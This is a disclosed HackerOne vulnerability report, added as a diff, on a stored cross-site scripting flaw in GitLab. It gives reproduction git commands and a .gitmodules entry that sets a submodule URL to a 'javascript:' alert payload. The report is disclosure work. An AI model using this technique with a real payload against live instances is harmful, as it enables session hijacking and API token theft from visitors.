@@ -1,0 +1,66 @@
+ReportLink:https://hackerone.com/reports/218872
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/jobert
+ReportedTo:GitLab(gitlab)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:09.05.2017 16:00:07
+
+Summary:
+
+# Vulnerability description
+There's a stored Cross-Site Scripting (XSS) vulnerability in the Files overview of a project due to the incorrect handling of a git submodule. This allows an attacker to execute JavaScript in a visitor's session.
+
+# Proof of concept
+To reproduce the issue, the attacker needs to have a project with push access. To start, make sure you're signed in and have enabled the wiki. Now, clone both repositories:
+
+```
+git clone git@gitlab.com:user/project
+git clone git@gitlab.com:user/project.wiki
+```
+
+Now `cd project.wiki`  and initialize the repository:
+
+```
+touch some-file
+git add some-file
+git commit -am "Added file to initialize wiki repository"
+git push
+```
+
+Now repeat the same in the `project` directory add the `project.wiki` as a relative git submodule to `project`:
+
+```
+touch some-file
+git add some-file
+git commit -am "Added file to initialize project repository"
+git push
+git submodule add ../project.wiki wiki
+git add wiki
+git commit -am "Added relative wiki module"
+git push
+```
+
+This will create a `.gitmodules` file with the following contents:
+
+```
+[submodule "wiki"]
+  path = wiki
+  url = ../project.wiki
+```
+
+In this file, the URL can be updated to a `javascript:` URL. It won't error because the contents of the submodule are already fetched by the `git submodule add` command. Lets change `url = ../project.wiki` to `url = javascript:alert('XSS');` (see F173589). Now commit the results and push the changes:
+
+```
+git add .
+git commit -am "Updated relative URL"
+git push
+```
+
+Now go to the project's Files overview: https://gitlab.com/user/project/tree/master. In the overview, click the `wiki` directory, and see the JavaScript getting executed:
+
+{F173602}
+
+# Impact
+An attacker could offload the current user's API token and impersonate the user through the API.
